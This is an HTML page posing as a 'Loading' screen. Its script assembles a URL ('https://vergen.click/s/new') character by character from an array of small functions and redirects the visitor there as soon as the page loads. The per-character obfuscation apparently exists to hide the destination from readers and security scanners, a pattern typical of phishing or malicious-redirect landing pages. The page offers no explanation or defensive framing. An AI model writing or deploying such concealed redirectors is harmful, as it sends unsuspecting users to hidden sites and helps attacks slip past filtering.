<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            () => 'h',
            () => 't',
            () => 't',
            _ => 'p',
            _ => 's',
            function() { return ':'; },
            function() { return '/'; },
            () => '/',
            () => 'v',
            () => 'e',
            _ => 'r',
            _ => 'g',
            function() { return 'e'; },
            () => 'n',
            _ => '.',
            _ => 'c',
            _ => 'l',
            _ => 'i',
            function() { return 'c'; },
            () => 'k',
            function() { return '/'; },
            _ => 's',
            function() { return '/'; },
            () => 'n',
            function() { return 'e'; },
            function() { return 'w'; }
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
